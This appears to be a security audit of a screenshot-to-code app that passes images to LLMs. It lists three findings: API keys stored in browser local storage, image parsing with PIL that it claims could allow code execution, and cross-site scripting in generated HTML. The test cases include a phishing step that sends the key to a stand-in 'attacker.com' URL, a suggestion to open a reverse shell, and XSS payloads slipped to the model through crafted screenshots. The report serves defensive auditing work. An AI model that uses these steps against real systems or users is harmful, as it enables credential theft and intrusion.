### List of Vulnerabilities

This document outlines the identified vulnerabilities within the application, detailing their descriptions, impacts, ranks, mitigations, preconditions, source code analysis, and security test cases.

#### 1. Insecure Storage of OpenAI API Keys in Browser Local Storage

- **Vulnerability Name:** Insecure Storage of OpenAI API Keys in Browser Local Storage
- **Description:**
    1. The application requires users to input their OpenAI API keys in the settings dialog for functionality.
    2. These API keys are stored directly in the browser's local storage.
    3. Local storage, while client-side, is susceptible to various client-side attacks. Specifically:
        - **Phishing Attacks:** A significant risk is phishing. An attacker can create a website that is visually identical to the legitimate application. If a user, tricked by the phishing site, enters their API key, the malicious site's JavaScript can readily access the local storage (within the context of the phishing domain) and exfiltrate the API key.
        - **Cross-Site Scripting (XSS):** Although not currently present, if the application were to become vulnerable to XSS, attackers could use JavaScript to steal API keys from local storage.
        - **Malware:** If a user's browser or computer is compromised by malware, the malware could potentially access and steal data stored in local storage.
- **Impact:**
    - **Loss of OpenAI API Keys:** Attackers can successfully steal users' OpenAI API keys.
    - **Financial Loss:** Stolen API keys can be used to make unauthorized requests to the OpenAI API, resulting in financial charges for the legitimate key owners.
    - **Potential Data Breach:** Depending on the permissions associated with the API key and the capabilities of the AI models, attackers might gain unauthorized access to or manipulation of data accessible through the OpenAI API.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - **Client-side Storage:** The application exclusively stores the API key in the browser's local storage. This is documented as a privacy measure, stating "Your key is only stored in your browser. Never stored on our servers." However, this does not mitigate client-side theft via phishing or other client-side attacks.
    - **No Backend Storage:** The backend is designed not to store or log API keys, limiting the risk of exposure if the backend itself is compromised.
- **Missing Mitigations:**
    - **Phishing Awareness Education:**  Crucially, users need to be educated about phishing risks and how to identify fake websites mimicking the application. This could involve in-app warnings, blog posts, or FAQ sections detailing phishing threats.
    - **Secure API Key Handling Guidance:** Users should be provided with best practices for API key management, such as using restricted API keys specifically for this application and regularly monitoring API usage for suspicious activity.
    - **Input Validation and Sanitization on Frontend:** While not directly related to storage, robust frontend input validation can help prevent future XSS vulnerabilities, which could be exploited to steal local storage data.
- **Preconditions:**
    - A user must be tricked into visiting a phishing website that convincingly imitates the legitimate application.
    - The user must then enter their OpenAI API key into the settings dialog on this phishing website, believing it to be the real application.
- **Source Code Analysis:**
    1. **Frontend Settings Dialog (Inferred):** The frontend likely contains a settings dialog implemented in JavaScript. This dialog would:
        - Read the API key from an input field.
        - Store the API key in local storage using `localStorage.setItem('openAiApiKey', apiKey)`.
    2. **Frontend API Request (Inferred):** When the application needs to use the API key, frontend JavaScript would:
        - Retrieve the API key from local storage using `localStorage.getItem('openAiApiKey')`.
        - Include the API key in requests to the backend API endpoints (e.g., `/generate-code` websocket route).
    3. **Backend API Usage:** The backend (`backend\config.py`, `backend\routes\generate_code.py`, `backend\llm.py`) receives the API key from the frontend and uses it for authenticating with the OpenAI API during the request. The backend does not persist or log the API key.
    4. **Documentation Review:** `Troubleshooting.md` and `README.md` confirm the client-side storage approach for API keys, instructing users to provide their keys and mentioning local browser storage.
- **Security Test Case:**
    1. **Phishing Website Setup:** Create a replica of the application's frontend settings dialog in a simple HTML page. Host this page on a public URL (using free hosting or ngrok for testing).
    2. **Malicious JavaScript Implementation:** Embed JavaScript in the phishing page to:
        - Mimic the settings dialog functionality.
        - Upon saving the API key, store it in the phishing site's local storage.
        - **Exfiltrate API Key:** Send the entered API key to an attacker-controlled server using `fetch()` or `XMLHttpRequest()` to a URL like `https://attacker.com/api/steal_key?key=<api_key>`.
        - Optionally redirect to the real application website to enhance deception.
    3. **Phishing Link Distribution:** Share the phishing website link with a test user.
    4. **User Interaction Simulation:** The test user visits the phishing site, enters a valid OpenAI API key in the fake settings dialog, and "saves" it.
    5. **Attacker Server Verification:** Check the attacker server logs to confirm successful receipt of the stolen API key.
    6. **Local Storage Inspection (Phishing Site):** Verify that the API key is stored in the phishing website's local storage in the test user's browser.

This test case successfully demonstrates the vulnerability by showing how easily an attacker can steal API keys through a phishing attack due to insecure local storage.

#### 2. PIL Image Processing Vulnerability Leading to Remote Code Execution

- **Vulnerability Name:** PIL Image Processing Vulnerability
- **Description:**
    1. An attacker uploads a maliciously crafted image file to the application.
    2. The backend receives this image data as a base64 encoded string through the `/generate-code` websocket endpoint.
    3. The `stream_claude_response` function in `backend/llm.py` processes this image using the `process_image` function from `backend/image_processing/utils.py` to prepare it for the Claude API.
    4. The `process_image` function decodes the base64 image data and uses the `PIL.Image.open(io.BytesIO(image_bytes))` function to open and parse the image file.
    5. The PIL library, used for image processing, is known to have vulnerabilities in parsing various image formats. A specially crafted image can exploit these vulnerabilities (e.g., buffer overflows, heap overflows, out-of-bounds reads/writes) during the `Image.open()`, `img.resize()`, or `img.save()` operations.
    6. Successful exploitation can lead to arbitrary code execution on the server, allowing the attacker to gain complete control of the server, steal sensitive data, or perform other malicious actions.
- **Impact:**
    - **Critical: Remote Code Execution (RCE).** An attacker can execute arbitrary code on the server running the application, leading to full system compromise.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - **None:** The code uses the PIL library for image processing without any explicit security measures to sanitize or validate the image file before processing.
- **Missing Mitigations:**
    - **Input Validation and Sanitization:** Implement robust server-side validation of uploaded image files, including:
        - **File Type Validation:** Verify that the uploaded file is indeed an image file (e.g., using magic bytes).
        - **Format-Specific Validation:** Use libraries to validate the internal structure of image files to detect and reject malformed or malicious files.
    - **Secure Image Processing Libraries/Sandboxing:** Consider using more secure image processing libraries or sandboxed environments for image processing to limit the impact of potential vulnerabilities.
    - **Regular Security Updates:** Keep the PIL library and other dependencies up-to-date to patch known vulnerabilities.
- **Preconditions:**
    - The application must be running and accessible over the network.
    - An attacker needs to be able to send a request to the `/generate-code` websocket endpoint with a malicious image. This is possible for any user with access to the application's frontend.
- **Source Code Analysis:**
    1. **`backend\routes\generate_code.py`:** The `/generate-code` websocket endpoint in `stream_code` function receives image data.
    2. **`backend\llm.py`:** In `stream_claude_response`, `process_image(image_data_url)` is called for image processing.
    ```python
    async def stream_claude_response(
        messages: List[ChatCompletionMessageParam],
        api_key: str,
        callback: Callable[[str], Awaitable[None]],
        model: Llm,
    ) -> Completion:
        ...
        for content in message["content"]:
            if content["type"] == "image_url":
                content["type"] = "image"
                image_data_url = cast(str, content["image_url"]["url"])
                (media_type, base64_data) = process_image(image_data_url) # [VULNERABLE CODE]
                ...
    ```
    3. **`backend\image_processing\utils.py`:** The `process_image` function uses `PIL.Image.open()` which is vulnerable.
    ```python
    def process_image(image_data_url: str) -> tuple[str, str]:
        ...
        image_bytes = base64.b64decode(base64_data)
        img = Image.open(io.BytesIO(image_bytes)) # [VULNERABLE CODE - PIL Image.open]
        ...
        img = img.resize((new_width, new_height), Image.DEFAULT_STRATEGY) # [VULNERABLE CODE - PIL resize]
        ...
        img.save(output, format="JPEG", quality=quality) # [VULNERABLE CODE - PIL save]
        ...
    ```
- **Security Test Case:**
    1. **Malicious Image Preparation:** Obtain or create a malicious image file designed to exploit a known vulnerability in the PIL library (e.g., a crafted PNG or JPEG). Resources like `vulhub` or security vulnerability databases can be helpful.
    2. **Application Access:** Ensure access to a publicly available instance or set up a local instance of the application.
    3. **Image Upload and Request:** Using the application's frontend:
        - Upload the prepared malicious image.
        - Initiate the code generation process.
    4. **Backend Server Monitoring:** Monitor the backend server for signs of exploitation:
        - Unexpected application crashes or server errors.
        - CPU or memory spikes.
        - Unexpected network connections.
        - File system modifications.
    5. **RCE Confirmation (if suspected):** If exploitation is suspected, attempt to confirm RCE:
        - Embed a command in the image to execute on the server (e.g., `whoami`, `hostname`).
        - Check server logs or network traffic for command execution.
        - For a definitive test, attempt to establish a reverse shell.
    6. **Vulnerability Validation:** If server crashes, command execution, or reverse shell is achieved, the vulnerability is confirmed.

This test case will validate the Image Processing Vulnerability and demonstrate the potential for Remote Code Execution.

#### 3. Cross-Site Scripting (XSS) in AI-Generated Code

- **Vulnerability Name:** Cross-Site Scripting (XSS) in AI-Generated Code
- **Description:**
    1. An attacker crafts a malicious screenshot or design mockup image that includes text or visual elements designed to be interpreted as HTML or JavaScript code. This could involve embedding XSS payloads directly within the visual representation, such as `<img src=x onerror=alert('XSS')>`.
    2. A user uploads this malicious image to the application via the frontend.
    3. The application backend processes the image using an AI model (e.g., Claude Sonnet 3.7, GPT-4o) to generate code. Due to the nature of AI models and the application's goal to faithfully translate visual input into code, the AI model may generate code that includes the malicious payload from the screenshot without sanitization.
    4. The backend, specifically in `backend\codegen\utils.py` and `backend\routes\generate_code.py`, processes the AI-generated code, extracting HTML content without any sanitization or security filtering. The `extract_html_content` function merely extracts HTML using regex without removing potentially malicious scripts.
    5. The backend then sends this unsanitized generated code to the frontend via a WebSocket connection.
    6. The frontend receives the unsanitized code and directly renders it within the user's browser. If the AI-generated code contains malicious JavaScript or HTML, these scripts will be executed in the user's browser, resulting in Cross-Site Scripting (XSS).
    7. This XSS vulnerability allows an attacker to execute arbitrary JavaScript code within the browser of any user who views or interacts with the AI-generated output.
- **Impact:**
    - **High:** Successful XSS exploitation allows attackers to:
        - **Account Hijacking:** Steal session cookies or authentication tokens, leading to account takeover.
        - **Data Theft:** Exfiltrate sensitive information from the user's browser or the application.
        - **Malware Distribution:** Redirect users to websites hosting malware or trick them into downloading malicious files.
        - **Website Defacement:** Alter the visual appearance or functionality of the web application for the victim user.
        - **Redirection to Malicious Websites:** Silently redirect users to attacker-controlled websites for phishing or malware distribution.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - **None:** The project lacks any input sanitization or output encoding to prevent XSS vulnerabilities in the generated code. The code generation process uses LLMs and extracts HTML without any security measures. The function `extract_html_content` in `backend\codegen\utils.py` is purely for extraction and does not perform sanitization.
- **Missing Mitigations:**
    - **Output Sanitization (Backend):** Implement server-side sanitization of the AI-generated HTML code before sending it to the frontend. Use a robust HTML sanitization library (e.g., DOMPurify, Bleach) to parse and sanitize the HTML, removing potentially malicious JavaScript code or attributes in `backend\routes\generate_code.py`.
    - **Content Security Policy (CSP) (Frontend):** Implement a Content Security Policy (CSP) in the frontend to restrict the sources from which the browser can load resources and prevent inline JavaScript execution.
    - **User Education and Warnings:** Display clear warnings to users about the security risks of deploying AI-generated code without review and sanitization.
- **Preconditions:**
    - An attacker must be able to craft a malicious screenshot that tricks the AI model into generating vulnerable code.
    - A user must utilize the application to process this screenshot and generate code.
    - The generated code must be rendered in a web environment, either within the application or when copied and deployed by a user.
- **Source Code Analysis:**
    1. **`backend\routes\generate_code.py`:**
        ```python
        from codegen.utils import extract_html_content
        @router.websocket("/generate-code")
        async def stream_code(websocket: WebSocket):
            # ...
            completions = [extract_html_content(completion) for completion in completions]
            for index, updated_html in enumerate(completions):
                await send_message("setCode", updated_html, index) # Sends unsanitized code
        ```
        - No sanitization is performed on `updated_html` before sending to the frontend.
    2. **`backend\codegen\utils.py`:**
        ```python
        def extract_html_content(text: str):
            match = re.search(r"(<html.*?>.*?</html>)", text, re.DOTALL)
            if match:
                return match.group(1)
            else:
                return text
        ```
        - `extract_html_content` only extracts HTML using regex, no sanitization.
- **Security Test Case:**
    1. **Malicious Screenshot Creation:** Create a PNG screenshot (e.g., `xss_screenshot.png`) visually representing a button with the XSS payload: `<button>Click Me <img src=x onerror=alert('XSS Vulnerability!')> </button>`.
    2. **Application Access:** Open the application frontend.
    3. **Screenshot Upload:** Upload `xss_screenshot.png`.
    4. **Stack and Model Selection:** Choose any stack (e.g., "HTML + Tailwind") and AI model.
    5. **Code Generation:** Generate code.
    6. **Generated Code Review:** Examine the generated code; it should contain the XSS payload.
    7. **Deployment and Testing:** Copy the generated HTML, create `test_xss.html`, paste the code, and open it in a browser.
    8. **XSS Trigger:** An alert box "XSS Vulnerability!" should appear, confirming the XSS vulnerability.

This test case demonstrates that a malicious screenshot can be used to inject XSS payloads into the generated code, which is then executed in the user's browser.
